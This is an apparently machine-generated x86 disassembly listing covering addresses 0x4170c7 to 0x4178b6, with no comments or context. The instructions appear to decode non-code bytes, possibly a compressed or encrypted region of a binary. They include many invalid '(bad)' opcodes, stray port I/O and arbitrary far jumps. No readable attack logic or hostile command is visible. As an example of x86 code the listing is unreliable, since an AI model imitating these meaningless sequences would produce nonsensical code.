  4170c7:	xlat   BYTE PTR ds:[ebx]
  4170c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170c9:	adc    al,0xca
  4170cb:	in     al,dx
  4170cc:	cmp    eax,0x7a7c8dd7
  4170d1:	cmp    DWORD PTR [ecx],0x8f84af90
  4170d7:	push   esi
  4170d8:	daa    
  4170d9:	sbb    al,0x92
  4170db:	scas   eax,DWORD PTR es:[edi]
  4170dc:	jp     0x4170c8
  4170de:	inc    esi
  4170df:	loopne 0x41708c
  4170e1:	test   al,0x61
  4170e3:	fld    DWORD PTR [edx+0x1bc0440e]
  4170e9:	sbb    bh,BYTE PTR [eax]
  4170eb:	sub    BYTE PTR [eax-0x29],ah
  4170ee:	(bad)  
  4170ef:	dec    esp
  4170f0:	dec    esp
  4170f1:	adc    eax,DWORD PTR [ebx+0x75a494e0]
  4170f7:	jmp    0x417131
  4170f9:	call   0x78a62974
  4170fe:	addr16 jnp 0x41710e
  417101:	and    DWORD PTR [esi+0x9d43238],esp
  417107:	shl    BYTE PTR [esi-0x6bb8a68f],0xc1
  41710e:	iret   
  41710f:	iret   
  417110:	ss aam 0x19
  417113:	add    bl,BYTE PTR [edi]
  417115:	mov    ebx,0xfdc76472
  41711a:	aas    
  41711b:	dec    esi
  41711c:	aaa    
  41711d:	sbb    dh,bl
  41711f:	inc    eax
  417120:	(bad)  
  417121:	inc    DWORD PTR [edx+eiz*1+0x1c6982f8]
  417128:	add    esp,DWORD PTR [esp+eax*4-0x4d729d75]
  41712f:	adc    cl,BYTE PTR [edi+0x14]
  417132:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417133:	in     al,0x15
  417135:	scas   al,BYTE PTR es:[edi]
  417136:	push   esi
  417137:	jns    0x4170c0
  417139:	or     DWORD PTR [edx],eax
  41713b:	out    0xf0,eax
  41713d:	in     al,dx
  41713e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41713f:	int    0xb8
  417141:	or     bh,0xdf
  417144:	lock cdq 
  417146:	rol    DWORD PTR [eax+0x8],0x60
  41714a:	jae    0x417143
  41714c:	inc    edi
  41714d:	add    esi,DWORD PTR [bp+di+0x4873]
  417152:	imul   ecx,DWORD PTR [esp+ebp*8],0xe7773719
  417159:	lock cmc 
  41715b:	lock push 0xffffffda
  41715e:	mov    ebp,0xabe3b46b
  417163:	mov    esp,DWORD PTR [edx+0xe]
  417166:	mov    ch,0x43
  417168:	dec    ecx
  417169:	push   ds
  41716a:	loope  0x417165
  41716c:	pop    ss
  41716d:	(bad)
  417172:	std    
  417173:	sahf   
  417174:	rol    DWORD PTR [ebx-0x33383d33],1
  41717a:	xchg   edi,eax
  41717b:	add    BYTE PTR [ebp+0x607ebc98],ah
  417181:	cmp    BYTE PTR [ebx+esi*2-0x5d],ah
  417185:	lea    ebp,[ecx]
  417187:	icebp  
  417188:	xor    dx,WORD PTR [eax+0x3c8d52eb]
  41718f:	mov    ah,0xbd
  417191:	(bad)  
  417192:	cmp    BYTE PTR [esi-0x36],dh
  417195:	fdivr  st(0),st
  417197:	dec    esi
  417198:	in     al,dx
  417199:	(bad)  
  41719a:	dec    cx
  41719c:	fild   DWORD PTR [eax+0x5879edcc]
  4171a2:	add    al,0x7b
  4171a4:	mov    dh,0x66
  4171a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171a7:	cld    
  4171a8:	retf   
  4171a9:	(bad)  
  4171aa:	cmc    
  4171ab:	call   0x5705:0x36e5e96b
  4171b2:	repz fcomp QWORD PTR [ecx+0x2c]
  4171b6:	jno    0x417194
  4171b8:	dec    eax
  4171b9:	fxch   st(4)
  4171bb:	jecxz  0x4171c5
  4171bd:	push   0xffffffb0
  4171bf:	jle    0x4171aa
  4171c1:	sub    al,0x62
  4171c3:	cdq    
  4171c4:	push   0x4387e1b1
  4171c9:	mov    edx,0x40ff553b
  4171ce:	add    BYTE PTR [eax-0x48],dl
  4171d1:	dec    ebx
  4171d2:	les    esp,FWORD PTR [edi-0x56]
  4171d5:	mov    ah,0x9f
  4171d7:	add    eax,DWORD PTR [edi+0x42]
  4171da:	inc    ebp
  4171db:	cmp    al,BYTE PTR [esi]
  4171dd:	cmp    esi,ecx
  4171df:	push   ebp
  4171e0:	xchg   edi,eax
  4171e1:	ds aaa 
  4171e3:	daa    
  4171e4:	not    BYTE PTR [edx]
  4171e6:	push   esp
  4171e7:	inc    ebx
  4171e8:	je     0x417225
  4171ea:	xor    eax,0xf33edc14
  4171ef:	in     al,dx
  4171f0:	shl    DWORD PTR [ebp+0x4f8fac6f],1
  4171f6:	mov    DWORD PTR [eax+0xd],0xce6836f4
  4171fd:	jle    0x4171e5
  4171ff:	in     eax,dx
  417200:	xor    esp,DWORD PTR [ebx]
  417202:	emms   
  417204:	mul    BYTE PTR [esi-0x2a445ee4]
  41720a:	sbb    ebp,edi
  41720c:	dec    esp
  41720d:	mov    dh,0x70
  41720f:	dec    edi
  417210:	pop    ds
  417211:	pop    esi
  417212:	push   edi
  417213:	addr16 (bad) 
  417215:	stc    
  417216:	or     ebp,ebp
  417218:	add    BYTE PTR [eax],ch
  41721a:	cld    
  41721b:	mov    al,ds:0x6a1e0afe
  417220:	jg     0x417262
  417222:	mov    al,0x9d
  417224:	pop    esi
  417225:	out    dx,eax
  417226:	and    eax,0x4158769d
  41722b:	and    DWORD PTR [ebx+0x60383991],edx
  417231:	cmp    al,0x61
  417233:	xor    al,0xb9
  417235:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417236:	inc    edi
  417237:	or     DWORD PTR [esi-0x3],edi
  41723a:	xchg   esp,eax
  41723b:	fidivr DWORD PTR [esi+0x5e6bc0e9]
  417241:	int3   
  417242:	cwde   
  417243:	or     ch,al
  417245:	or     BYTE PTR [edx+0x32addbba],bh
  41724b:	xchg   ebp,eax
  41724c:	int    0x6e
  41724e:	xor    eax,0x763e3c14
  417253:	je     0x417295
  417255:	dec    edi
  417256:	jp     0x4172bc
  417258:	xchg   ecx,eax
  417259:	lahf   
  41725a:	xor    DWORD PTR ds:0x6cab5f90,ecx
  417260:	fistp  DWORD PTR [ebp+0x4b]
  417263:	and    edi,esi
  417265:	cmp    eax,0xfbe7c499
  41726a:	scas   al,BYTE PTR es:[edi]
  41726b:	push   esi
  41726c:	pmullw mm7,QWORD PTR [ecx]
  41726f:	sti    
  417270:	push   esp
  417271:	imul   ebx,DWORD PTR [ecx],0x68db91e8
  417277:	xor    al,0x7d
  417279:	xchg   DWORD PTR [edx+0x621afd34],ebp
  41727f:	out    dx,al
  417280:	jbe    0x41724c
  417282:	sbb    eax,0xb05ed70b
  417287:	jmp    0xefe8:0x2eccb860
  41728e:	or     ah,bl
  417290:	test   al,0xc3
  417292:	jle    0x417242
  417294:	in     eax,dx
  417295:	push   edx
  417296:	popf   
  417297:	jge    0x41724e
  417299:	sbb    eax,0x9ed09fd
  41729e:	(bad)  
  41729f:	repnz adc esi,DWORD PTR [ebx-0x60]
  4172a3:	push   es
  4172a4:	(bad)  
  4172a5:	dec    eax
  4172a6:	pushf  
  4172a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172a8:	push   edx
  4172a9:	mov    ah,0x6f
  4172ab:	fld    TBYTE PTR [esi-0x24039635]
  4172b1:	in     al,0x5d
  4172b3:	repz loopne 0x417311
  4172b6:	sub    BYTE PTR [ebp+ebp*8-0x33],al
  4172ba:	push   esi
  4172bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172bc:	mov    edi,0x44cf4f0a
  4172c1:	ds ret 0xe873
  4172c5:	test   BYTE PTR [esi+0x44],bh
  4172c8:	ret    0x4684
  4172cb:	pop    ebx
  4172cc:	push   0x2a
  4172ce:	daa    
  4172cf:	pop    eax
  4172d0:	jns    0x417256
  4172d2:	dec    eax
  4172d3:	pushf  
  4172d4:	in     al,0x95
  4172d6:	jg     0x417276
  4172d8:	jp     0x417301
  4172da:	dec    ebx
  4172db:	or     eax,0xd95f7fc2
  4172e0:	jno    0x417301
  4172e2:	shl    BYTE PTR [eax],1
  4172e4:	jmp    0x4172c7
  4172e6:	leave  
  4172e7:	xchg   esi,eax
  4172e8:	add    eax,0xebc3445
  4172ed:	xor    dh,dl
  4172ef:	push   edi
  4172f0:	adc    eax,0x5e55f8f1
  4172f5:	sbb    eax,0xe4ac78ce
  4172fa:	dec    edx
  4172fb:	in     eax,dx
  4172fc:	mov    esi,gs
  4172fe:	mov    ds:0x77bd8327,al
  417303:	inc    esi
  417304:	sbb    bl,BYTE PTR [ecx]
  417306:	xor    dh,BYTE PTR [edi+ecx*4+0x34]
  41730a:	sub    ebp,esp
  41730c:	repnz inc ebp
  41730e:	popf   
  41730f:	sub    esp,esp
  417311:	mov    ds:0x9310a6d7,eax
  417316:	cmp    cl,BYTE PTR [eax+0x3e]
  417319:	sti    
  41731a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41731b:	xchg   esi,eax
  41731c:	xchg   edx,eax
  41731d:	dec    edi
  41731e:	xor    eax,DWORD PTR [eax+0x27c2c1ef]
  417324:	inc    esi
  417325:	mov    ds:0xbec48b15,al
  41732a:	(bad)  
  41732b:	clc    
  41732c:	xor    al,0x30
  41732e:	stos   BYTE PTR es:[edi],al
  41732f:	push   ebp
  417330:	or     eax,0x9df234e5
  417335:	ins    DWORD PTR es:[edi],dx
  417336:	or     eax,0xfc4ce594
  41733b:	ins    BYTE PTR es:[edi],dx
  41733c:	jmp    0xb7ac:0x61324ded
  417343:	adc    esi,DWORD PTR [edx+0x13]
  417346:	and    esi,DWORD PTR [ebp+0x72]
  417349:	call   0x40c8:0x49bbf84f
  417350:	sbb    BYTE PTR [eax+eiz*1+0x6059b6ac],ah
  417357:	xchg   edx,eax
  417358:	imul   esp,DWORD PTR [edx],0xffffff8a
  41735b:	jno    0x4173bd
  41735d:	jle    0x41732c
  41735f:	(bad)  
  417360:	fidiv  DWORD PTR [ebp-0x80]
  417363:	pop    esi
  417364:	imul   BYTE PTR [ecx]
  417366:	and    al,0xf6
  417368:	das    
  417369:	retf   
  41736a:	sub    al,0x9c
  41736c:	loop   0x4172ff
  41736e:	jl     0x4173b0
  417370:	aam    0x43
  417372:	cmp    edi,esi
  417374:	mul    DWORD PTR [edi]
  417376:	pushf  
  417377:	in     eax,0xf8
  417379:	mov    ebx,0xf8e2dbc7
  41737e:	push   esi
  41737f:	mov    ebx,0x2822a788
  417384:	pop    edi
  417385:	fild   DWORD PTR [eax+ebp*8]
  417388:	push   ebp
  417389:	pop    eax
  41738a:	add    esi,DWORD PTR [ecx]
  41738c:	jmp    0x779e9fb4
  417391:	ss push edi
  417393:	xchg   ecx,eax
  417394:	sahf   
  417395:	mov    ch,0xc8
  417397:	or     al,0xd1
  417399:	test   DWORD PTR [edi-0x1e],esp
  41739c:	push   cs
  41739d:	add    BYTE PTR [esi-0x6d15e731],dh
  4173a3:	sub    ch,ah
  4173a5:	in     al,0xe3
  4173a7:	inc    esi
  4173a8:	sbb    eax,0x3331f088
  4173ad:	sahf   
  4173ae:	cmp    ch,BYTE PTR [edx]
  4173b0:	mov    ch,0x49
  4173b2:	sub    eax,ecx
  4173b4:	repz sbb BYTE PTR [ecx],ch
  4173b7:	sbb    ebp,DWORD PTR [edx]
  4173b9:	jo     0x417346
  4173bb:	add    eax,0x127e141d
  4173c0:	push   ebp
  4173c1:	push   ds
  4173c2:	cli    
  4173c3:	mov    BYTE PTR [ecx+0x7692112c],cl
  4173c9:	dec    edx
  4173ca:	jo     0x41739d
  4173cc:	push   0xffffffce
  4173ce:	xlat   BYTE PTR ds:[ebx]
  4173cf:	pop    ebp
  4173d0:	jne    0x417449
  4173d2:	(bad)  
  4173d3:	mov    ds:0xead919ba,eax
  4173d8:	pop    esi
  4173d9:	mov    ebp,0x454ca7c4
  4173de:	sbb    dl,ah
  4173e0:	add    eax,DWORD PTR [esp+eax*8-0x68]
  4173e4:	cmp    eax,0x570b219f
  4173e9:	cld    
  4173ea:	jnp    0x417433
  4173ec:	xchg   edi,eax
  4173ed:	push   0xb9ee6ac6
  4173f2:	das    
  4173f3:	(bad)  
  4173f4:	adc    DWORD PTR [ebp+0x74],eax
  4173f7:	xor    ebx,eax
  4173f9:	fs xchg ebp,eax
  4173fb:	shr    dh,cl
  4173fd:	mov    ch,0xb2
  4173ff:	fdiv   st(4),st
  417401:	sbb    BYTE PTR [edx+0x35aa8265],dl
  417407:	or     dl,BYTE PTR [eax-0x5d657c62]
  41740d:	fld    DWORD PTR [eax]
  41740f:	mov    edx,0x9261ef75
  417414:	js     0x4173b4
  417416:	enter  0x62a4,0x1f
  41741a:	shl    BYTE PTR [esi-0x5b],0x6d
  41741e:	test   al,0x4e
  417420:	sub    BYTE PTR [ebx-0x46],al
  417423:	adc    al,0xf5
  417425:	mov    ds:0xbe73edc4,al
  41742a:	sbb    edi,DWORD PTR [edx+0x49]
  41742d:	scas   al,BYTE PTR es:[edi]
  41742e:	mov    ah,0xe0
  417430:	push   es
  417431:	int3   
  417432:	into   
  417433:	push   esp
  417434:	sti    
  417435:	ret    0xc05b
  417438:	dec    edx
  417439:	adc    al,0x6b
  41743b:	retf   0xe7d
  41743e:	xchg   DWORD PTR [ebx-0x3dc57128],edx
  417444:	adc    eax,0xa00a7df8
  417449:	enter  0xb2ab,0x7b
  41744d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41744e:	push   edx
  41744f:	mov    esp,0xc16d40ea
  417454:	jl     0x4173fc
  417456:	mov    bh,0x34
  417458:	xor    DWORD PTR [edx-0x65],ebx
  41745b:	or     al,0x61
  41745d:	mov    eax,ds:0xf4ca3003
  417462:	mov    dh,0xa8
  417464:	int3   
  417465:	add    bh,BYTE PTR [edx-0xc62b88b]
  41746b:	adc    eax,0x3453304a
  417470:	xor    al,0x88
  417472:	nop
  417473:	jne    0x417497
  417475:	pop    ss
  417476:	sbb    DWORD PTR [ecx+0x6baa7d23],edx
  41747c:	jb     0x4174a0
  41747e:	push   edi
  41747f:	gs leave 
  417481:	add    eax,edx
  417483:	dec    ebp
  417484:	popf   
  417485:	mov    dl,0x1d
  417487:	loop   0x4174b0
  417489:	in     al,dx
  41748a:	imul   edx,DWORD PTR [esi+0xcf98300],0xd8ce0365
  417494:	(bad)  
  417495:	js     0x41750c
  417497:	retf   0x1002
  41749a:	sub    BYTE PTR [eax],0x76
  41749d:	and    ah,BYTE PTR [esi-0x2ae8161e]
  4174a3:	stos   BYTE PTR es:[edi],al
  4174a4:	mov    edi,0x2b5ae6ba
  4174a9:	stos   DWORD PTR es:[edi],eax
  4174aa:	mov    eax,0xcb1cd7b7
  4174af:	mov    ecx,0xb19cb99d
  4174b4:	pop    edi
  4174b5:	add    al,0xbd
  4174b7:	jle    0x4174fe
  4174b9:	daa    
  4174ba:	in     al,0xc6
  4174bc:	popa   
  4174bd:	dec    esi
  4174be:	stos   BYTE PTR es:[edi],al
  4174bf:	rol    BYTE PTR [ecx-0x51d5e9be],cl
  4174c5:	mov    ebx,0x11378d71
  4174ca:	sbb    al,0x0
  4174cc:	mov    esp,0xeb60a668
  4174d1:	clc    
  4174d2:	xchg   esi,eax
  4174d3:	sub    bl,BYTE PTR [ebx-0x7b]
  4174d6:	clc    
  4174d7:	cld    
  4174d8:	rcl    DWORD PTR [edx-0x5322161e],1
  4174de:	or     eax,0x1c4ff54d
  4174e3:	and    bh,BYTE PTR [edx]
  4174e5:	test   eax,0xd34e5f75
  4174ea:	scas   al,BYTE PTR es:[edi]
  4174eb:	icebp  
  4174ec:	jle    0x4174e9
  4174ee:	fwait
  4174ef:	sbb    eax,0x8c9b7e52
  4174f4:	mov    bl,0xac
  4174f6:	popf   
  4174f7:	cmp    esi,eax
  4174f9:	mov    ?,WORD PTR [edi-0x74]
  4174fc:	int    0xfd
  4174fe:	xchg   BYTE PTR [ebp+esi*4+0x32],bl
  417502:	stos   DWORD PTR es:[edi],eax
  417503:	test   eax,0x816df341
  417508:	loop   0x417574
  41750a:	jecxz  0x41756d
  41750c:	or     eax,0x6d43c228
  417511:	ja     0x4174b1
  417513:	jmp    0x6be1fbbb
  417518:	push   ds
  417519:	dec    edx
  41751a:	push   edx
  41751b:	mov    ebp,0x206a0db0
  417520:	sub    bh,BYTE PTR [edx+0x69065729]
  417526:	stc    
  417527:	cli    
  417528:	xchg   ebp,eax
  417529:	(bad)  
  41752a:	rcr    al,cl
  41752c:	mov    al,0x64
  41752e:	popf   
  41752f:	mov    eax,0x82ab6056
  417534:	into   
  417535:	ds push ss
  417537:	dec    edi
  417538:	add    al,0x70
  41753a:	and    BYTE PTR [ebp+0x57],ch
  41753d:	adc    DWORD PTR [ecx+0x22],esp
  417540:	pop    edx
  417541:	loop   0x4175aa
  417543:	fcomp  DWORD PTR [ebp+0x76]
  417546:	loop   0x4174f2
  417548:	ret    
  417549:	push   esi
  41754a:	and    eax,0xf51d86c0
  41754f:	jg     0x4174e2
  417551:	test   DWORD PTR [eax],esp
  417553:	lds    edx,FWORD PTR [ebp-0x32]
  417556:	enter  0x6aa7,0x64
  41755a:	xchg   esp,eax
  41755b:	sub    al,0xe
  41755d:	iret   
  41755e:	dec    esp
  41755f:	jl     0x417517
  417561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417562:	fild   WORD PTR [ecx-0x4effbfb3]
  417568:	loope  0x4175db
  41756a:	jo     0x4175a0
  41756c:	fbld   TBYTE PTR [ecx]
  41756e:	mov    ebx,0x9c72d7d5
  417573:	push   edi
  417574:	dec    edx
  417575:	outs   dx,DWORD PTR ds:[esi]
  417576:	pop    eax
  417577:	jb     0x417587
  417579:	fmul   st,st(6)
  41757b:	imul   ebp,DWORD PTR [esi],0xa658dce3
  417581:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417582:	dec    ecx
  417583:	pop    eax
  417584:	mov    edx,0x76ee3d87
  417589:	jl     0x417522
  41758b:	push   0xd3b15f07
  417590:	jl     0x41753a
  417592:	dec    edi
  417593:	(bad)  
  417595:	jmp    0xf3f7:0x883302d
  41759c:	les    esp,FWORD PTR [eax+0x2b]
  41759f:	mov    eax,ds:0x7decc3f0
  4175a4:	cwde   
  4175a5:	xchg   ebx,eax
  4175a6:	push   0xd53b1ed5
  4175ab:	jp     0x41759c
  4175ad:	shl    DWORD PTR [edx],1
  4175af:	imul   DWORD PTR [ecx]
  4175b1:	imul   edi,DWORD PTR [edi+edi*4],0xb9e1ef65
  4175b8:	je     0x4175a7
  4175ba:	mov    esi,0xb7e17351
  4175bf:	pop    edi
  4175c0:	std    
  4175c1:	jbe    0x417543
  4175c3:	adc    al,BYTE PTR [ebx+0x5f]
  4175c6:	push   0x6
  4175c8:	or     al,0xb2
  4175ca:	stos   DWORD PTR es:[edi],eax
  4175cb:	add    DWORD PTR [edx+0x16],0x15
  4175cf:	or     eax,DWORD PTR [ecx-0x1]
  4175d2:	sbb    eax,0xa10363de
  4175d7:	xor    esp,DWORD PTR [edx+eax*8+0x4c]
  4175db:	rcl    DWORD PTR [eax+0x3769f699],cl
  4175e1:	(bad)
  4175e4:	mov    ebp,DWORD PTR [esi+ebp*4-0x260cc0d0]
  4175eb:	adc    al,0x10
  4175ed:	fmulp  st(2),st
  4175ef:	inc    eax
  4175f0:	fisttp WORD PTR [ebx+eiz*4-0x1a]
  4175f4:	scas   eax,DWORD PTR es:[edi]
  4175f5:	inc    ebx
  4175f6:	mov    cl,0xbd
  4175f8:	fdivrp st(7),st
  4175fa:	mov    ecx,0x98531e40
  4175ff:	imul   edi,edx,0xfffffffc
  417602:	mov    ds:0xe63175e1,al
  417607:	lock ret 0x7e08
  41760b:	test   eax,0x7daed1b8
  417610:	out    dx,al
  417611:	stc    
  417612:	in     eax,0xe
  417614:	xor    DWORD PTR [ecx+ecx*2],eax
  417617:	mov    esi,ebx
  417619:	inc    edi
  41761a:	jmp    0x417660
  41761c:	rol    dh,cl
  41761e:	xor    al,0x79
  417620:	and    al,BYTE PTR [eax-0xe994f88]
  417626:	inc    ebp
  417628:	sahf   
  417629:	daa    
  41762a:	xchg   DWORD PTR [ecx],ecx
  41762c:	fcmovnb st,st(1)
  41762e:	dec    esp
  41762f:	jmp    0xb56:0x736f8e07
  417636:	xor    DWORD PTR [eax+0x7f],esp
  417639:	jge    0x4176b5
  41763b:	dec    edx
  41763c:	cdq    
  41763d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41763e:	mov    ch,dh
  417640:	mov    dh,0xe3
  417642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417643:	pop    esp
  417644:	adc    eax,0x856006ba
  417649:	mov    edx,0x2428c141
  41764e:	pop    ebp
  41764f:	lea    edi,[ebx-0x7b8965f4]
  417655:	aam    0xc5
  417657:	xor    al,0x94
  417659:	sub    ah,BYTE PTR [ecx+ecx*8]
  41765c:	push   edi
  41765d:	pop    edi
  41765e:	pop    ebx
  41765f:	cmp    esp,DWORD PTR [edx+0x4dfe02ee]
  417665:	mov    edi,0xce318931
  41766a:	xchg   edi,eax
  41766b:	xor    al,0x30
  41766d:	xor    al,0x19
  41766f:	and    eax,0x623325ea
  417674:	or     BYTE PTR [ebx+0xc],0x8b
  417678:	retf   
  417679:	ret    0x5bab
  41767c:	cmp    eax,DWORD PTR [esi-0x80b23e9]
  417682:	clc    
  417683:	sbb    ecx,DWORD PTR [ebp-0x5c]
  417686:	dec    ecx
  417687:	sbb    DWORD PTR [edx-0x7b],edx
  41768a:	and    al,0xe3
  41768c:	push   esi
  41768d:	and    DWORD PTR [ecx],eax
  41768f:	retf   
  417690:	push   esp
  417691:	pusha  
  417692:	ins    BYTE PTR es:[edi],dx
  417693:	mov    ah,0xbe
  417695:	or     al,0x65
  417697:	push   eax
  417698:	mov    al,BYTE PTR [ebx+0x5]
  41769b:	(bad)  
  41769c:	in     al,dx
  41769d:	pop    ss
  41769e:	aas    
  41769f:	mov    esp,DWORD PTR [edi+0x4e]
  4176a2:	fdiv   DWORD PTR [edx-0xbfa61fb]
  4176a8:	or     cl,BYTE PTR [eax-0x45]
  4176ab:	mov    ah,0xab
  4176ad:	scas   eax,DWORD PTR es:[edi]
  4176ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176af:	adc    ebx,DWORD PTR [eax+0x9]
  4176b2:	inc    edx
  4176b3:	nop
  4176b4:	jo     0x4176de
  4176b6:	xchg   ebp,eax
  4176b7:	pushf  
  4176b8:	stos   DWORD PTR es:[edi],eax
  4176b9:	xor    esp,ebx
  4176bb:	inc    edx
  4176bc:	pop    eax
  4176bd:	adc    DWORD PTR es:[ecx-0x213aa47],esi
  4176c4:	and    ecx,esi
  4176c6:	mov    ah,0xad
  4176c8:	outs   dx,DWORD PTR ds:[esi]
  4176c9:	or     BYTE PTR [eax+0x163fbc3f],ch
  4176cf:	mov    edx,0x1a237258
  4176d4:	std    
  4176d5:	fcmove st,st(4)
  4176d7:	(bad)  
  4176d8:	ror    ebp,0x58
  4176db:	popa   
  4176dc:	mov    esp,0x3204ef0c
  4176e1:	jecxz  0x4176a6
  4176e3:	pusha  
  4176e4:	sbb    bl,BYTE PTR [esi]
  4176e6:	dec    ebx
  4176e7:	sar    DWORD PTR ds:0x3e12783e,cl
  4176ed:	mov    eax,0xb622cee4
  4176f2:	cmp    ebx,DWORD PTR [eax]
  4176f4:	scas   al,BYTE PTR es:[edi]
  4176f5:	pushf  
  4176f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176f7:	cmp    cl,dl
  4176f9:	loope  0x4176e7
  4176fb:	data16 add al,0x8c
  4176fe:	rcr    BYTE PTR [edx+0x67],cl
  417701:	mov    ds,ebp
  417703:	push   es
  417704:	shl    BYTE PTR [eax-0x4d1b4b25],0x36
  41770b:	mov    ebx,0x3244259c
  417710:	repnz lods al,BYTE PTR es:[esi]
  417713:	lods   al,BYTE PTR ds:[esi]
  417714:	push   edx
  417715:	mov    edx,0x5ffa9f82
  41771a:	arpl   WORD PTR [edi],ax
  41771c:	add    eax,0x74a11475
  417721:	jg     0x4176ea
  417723:	pop    ecx
  417724:	sahf   
  417725:	jge    0x417748
  417727:	jb     0x4176ba
  417729:	enter  0x61ed,0xc0
  41772d:	out    dx,eax
  41772e:	inc    ebp
  41772f:	xchg   ebx,eax
  417730:	neg    BYTE PTR [edx]
  417732:	add    BYTE PTR [edi+0x6a],dl
  417735:	es pop edx
  417737:	sub    BYTE PTR [eax],ah
  417739:	(bad)  
  41773a:	out    dx,al
  41773b:	stc    
  41773c:	inc    esp
  41773d:	or     bh,BYTE PTR cs:[ecx-0x52]
  417741:	mov    bh,BYTE PTR [ebx]
  417743:	jg     0x4177a1
  417745:	jge    0x417737
  417747:	sti    
  417748:	fldenv ds:0xa0a96b8c
  41774e:	jmp    0x4fcf:0xfcfd1966
  417755:	data16 xlat BYTE PTR ds:[ebx]
  417757:	cmp    BYTE PTR [ecx+0x29e07402],0x5e
  41775e:	push   ecx
  41775f:	and    al,0x4
  417761:	and    al,0x5
  417763:	inc    edx
  417764:	ret    0xa51a
  417767:	mov    ebp,0x345e196
  41776c:	jo     0x41773d
  41776e:	test   BYTE PTR [ecx],dl
  417770:	js     0x41773a
  417772:	jnp    0x417769
  417774:	gs retf 
  417776:	mov    edx,0x4492d246
  41777b:	(bad)
  41777e:	push   ebx
  41777f:	push   ebx
  417780:	inc    esi
  417781:	iret   
  417782:	xchg   edi,eax
  417783:	int3   
  417784:	mov    WORD PTR [ebx],ds
  417786:	outs   dx,DWORD PTR ds:[esi]
  417787:	mov    DWORD PTR [esi-0xc],edi
  41778a:	jo     0x41775b
  41778c:	std    
  41778d:	hlt    
  41778e:	or     DWORD PTR [eax-0x66bee8f4],edi
  417794:	push   eax
  417795:	(bad)  
  417796:	adc    DWORD PTR [eax],esi
  417798:	repnz (bad) 
  41779a:	mov    BYTE PTR [edi+0x76],0xec
  41779e:	rcr    BYTE PTR [edi+edi*4-0x7f],0xc6
  4177a3:	call   0x8122:0xc545366
  4177aa:	syscall 
  4177ac:	cmp    eax,0x3670ed13
  4177b1:	call   0x68eff8a2
  4177b6:	sbb    bl,al
  4177b8:	es (bad) 
  4177ba:	loopne 0x4177c7
  4177bc:	sub    DWORD PTR [ebx-0xc4ac915],ebp
  4177c2:	or     DWORD PTR [ecx-0x7],edi
  4177c5:	and    BYTE PTR [edi],bl
  4177c7:	push   esp
  4177c8:	(bad)  
  4177c9:	adc    edi,DWORD PTR [edx+0x79f6caa4]
  4177cf:	in     al,0x28
  4177d1:	adc    BYTE PTR [edi-0x4a0b9611],al
  4177d7:	mov    eax,ds:0xf49fcc27
  4177dc:	inc    ecx
  4177dd:	and    eax,0xa8ed2109
  4177e2:	jno    0x417793
  4177e4:	test   eax,0x2d8fe34d
  4177e9:	cmp    al,0x9c
  4177eb:	ficomp DWORD PTR ds:0x8df6544e
  4177f1:	out    0x73,eax
  4177f3:	js     0x4177cd
  4177f5:	fsubr  st(4),st
  4177f7:	stos   BYTE PTR es:[edi],al
  4177f8:	and    BYTE PTR fs:[eax+0x50ce5433],0xbc
  417800:	jae    0x417790
  417802:	push   edx
  417803:	dec    ecx
  417804:	or     al,0x68
  417806:	into   
  417807:	out    dx,eax
  417808:	push   es
  417809:	inc    ecx
  41780a:	(bad)  
  41780b:	push   0xc682f7bf
  417810:	inc    DWORD PTR [ebp+0x5f57738d]
  417816:	std    
  417817:	push   ecx
  417818:	popa   
  417819:	mov    ds:0xd4d3b051,eax
  41781e:	not    BYTE PTR [ebp+ebp*2-0x7b2bf26a]
  417825:	jae    0x417816
  417827:	jmp    DWORD PTR [ecx]
  417829:	sub    al,al
  41782b:	imul   esp,edi,0xffffffca
  41782e:	jl     0x4177d1
  417830:	shr    BYTE PTR [edi+0x7b511cfb],1
  417836:	xor    DWORD PTR [eax],esp
  417838:	push   edi
  417839:	test   ebp,eax
  41783b:	add    BYTE PTR ds:0xfc63b697,0xa7
  417842:	int    0xfa
  417844:	sub    al,0x14
  417846:	fmul   DWORD PTR [ecx]
  417848:	or     al,0xd8
  41784a:	jmp    0xafc7:0x52eb8006
  417851:	enter  0x68c4,0xf9
  417855:	outs   dx,DWORD PTR ds:[esi]
  417856:	push   ss
  417857:	sub    bh,al
  417859:	repz pop eax
  41785b:	adc    bl,ch
  41785d:	inc    esi
  41785e:	xor    al,BYTE PTR [edi]
  417860:	jno    0x417867
  417862:	xor    ebx,DWORD PTR [ecx]
  417864:	sahf   
  417865:	ror    DWORD PTR [eax+ebp*4-0x27e3e2ac],1
  41786c:	xlat   BYTE PTR ds:[ebx]
  41786d:	jp     0x417864
  41786f:	adc    eax,0x5e82f19d
  417874:	sub    BYTE PTR [ecx-0xf09daef],bl
  41787a:	mov    ds:0x9e5c42d8,al
  41787f:	inc    esp
  417880:	xlat   BYTE PTR ds:[ebx]
  417881:	jae    0x41781a
  417883:	out    dx,eax
  417884:	hlt    
  417885:	mov    bh,0x71
  417887:	jne    0x4178bd
  417889:	out    0x74,al
  41788b:	sbb    esi,DWORD PTR [ecx]
  41788d:	mov    al,ds:0xc5816ae2
  417892:	fldl2t 
  417894:	xlat   BYTE PTR ds:[ebx]
  417895:	ss adc al,0x36
  417898:	(bad)  
  417899:	fnstenv [ebp-0x77]
  41789c:	call   0xd01d7438
  4178a1:	dec    edx
  4178a2:	xchg   esp,eax
  4178a3:	xor    bh,BYTE PTR [esi+ebx*4-0x1e65e676]
  4178aa:	fadd   QWORD PTR [ebx+edx*1]
  4178ad:	xor    BYTE PTR [esi+0x1e],bl
  4178b0:	xchg   esi,ebx
  4178b2:	mov    bl,0xda
  4178b4:	pop    eax
  4178b5:	inc    edx
  4178b6:	pop    esi
